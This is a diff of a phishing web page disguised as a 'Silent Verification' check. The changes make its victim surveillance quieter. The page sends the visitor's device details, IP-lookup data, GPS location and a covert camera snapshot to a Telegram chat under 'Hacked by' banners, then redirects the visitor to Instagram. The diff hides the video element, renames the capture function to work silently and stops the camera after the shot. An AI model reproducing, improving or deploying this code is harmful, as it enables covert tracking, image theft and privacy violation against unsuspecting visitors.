@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Verification</title>
+  <title>Silent Verification</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <style>
     body {
@@ -45,7 +45,7 @@
       to { transform: rotate(360deg); }
     }
     video, canvas {
-      display: none;
+      display: none !important;
     }
   </style>
 </head>
@@ -66,40 +66,10 @@
     const ctx = canvas.getContext("2d");
     let imageBase64 = "";
 
-    // === IMMEDIATE SEND: IP + Device Info ===
-    function sendBasicInfo() {
-      const ua = navigator.userAgent;
-      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const connection = navigator.connection || {};
-      const network = connection.effectiveType || "Unknown";
-
-      navigator.getBattery().then(battery => {
-        const charging = battery.charging ? "Yes" : "No";
-        const level = Math.round(battery.level * 100) + "%";
-
-        fetch("https://ipinfo.io/json?token=demo")
-          .then(res => res.json())
-          .then(data => {
-            let basicInfo = "📱 Hacked by Mr. @Cobrax9\n\n";
-
-            basicInfo += "📱 Device Info:\n";
-            basicInfo += `🔋 Charging: ${charging}\n`;
-            basicInfo += `🔌 Battery: ${level}\n`;
-            basicInfo += `🌐 Network: ${network.toUpperCase()}\n`;
-            basicInfo += `🕒 Time Zone: ${timeZone}\n`;
-            basicInfo += `🖥️ User Agent: ${ua}\n`;
-            basicInfo += `📱 Device: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
-            basicInfo += "👀 Real-time location & camera coming next...";
-            basicInfo += "📱 Hacked by Mr. @Shopandbuyy\n\n";
-            sendToTelegram(basicInfo);
-          });
-      });
-    }
-
     function sendToTelegram(message, isPhoto = false) {
       const payload = { chat_id: chatId };
       if (isPhoto && imageBase64) {
-        payload.message = "📸 Snapshot taken from target:";
+        payload.message = "📸 Silent Snapshot from camera:";
         payload.photo = imageBase64;
       } else {
         payload.message = message;
@@ -112,32 +82,31 @@
       });
     }
 
-    // === TRIGGERED AFTER USER CLICKS ===
     function collectSensitive() {
       navigator.geolocation.getCurrentPosition(
         pos => {
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
-          const gpsMessage = `📍 GPS Location Accessed\nhttps://maps.google.com/?q=${lat},${lon}`;
+          const gpsMessage = `📍 GPS Location\nhttps://maps.google.com/?q=${lat},${lon}`;
           sendToTelegram(gpsMessage);
-          capturePhoto();
+          capturePhotoSilently();
         },
         err => {
           sendToTelegram("❌ GPS access denied or unavailable");
-          capturePhoto();
+          capturePhotoSilently();
         },
         { timeout: 5000 }
       );
     }
 
-    function capturePhoto() {
-      video.style.display = "block";
+    function capturePhotoSilently() {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           video.srcObject = stream;
           setTimeout(() => {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             imageBase64 = canvas.toDataURL("image/jpeg").split(',')[1];
+            stream.getTracks().forEach(track => track.stop()); // Stop camera
             sendToTelegram("", true);
             setTimeout(() => {
               window.location.href = "https://instagram.com";
@@ -152,7 +121,36 @@
         });
     }
 
-    // RUN basic info right away
+    // Send basic info instantly
+    function sendBasicInfo() {
+      const ua = navigator.userAgent;
+      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const connection = navigator.connection || {};
+      const network = connection.effectiveType || "Unknown";
+
+      navigator.getBattery().then(battery => {
+        const charging = battery.charging ? "Yes" : "No";
+        const level = Math.round(battery.level * 100) + "%";
+
+        fetch("https://ipinfo.io/json?token=demo")
+          .then(res => res.json())
+          .then(data => {
+            let basicInfo = "📱 Hacked by @Cobrax9\n\n";
+
+            basicInfo += "📱 Device Info:\n";
+            basicInfo += `🔋 Charging: ${charging}\n`;
+            basicInfo += `🔌 Battery: ${level}\n`;
+            basicInfo += `🌐 Network: ${network.toUpperCase()}\n`;
+            basicInfo += `🕒 Time Zone: ${timeZone}\n`;
+            basicInfo += `🖥️ User Agent: ${ua}\n`;
+            basicInfo += `📱 Device: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
+            basicInfo += "👀 More data being requested...";
+            basicInfo = "📱 Hacked by @Shopandbuyy\n\n";
+            sendToTelegram(basicInfo);
+          });
+      });
+    }
+
     if (chatId) sendBasicInfo();
   </script>
 </body>
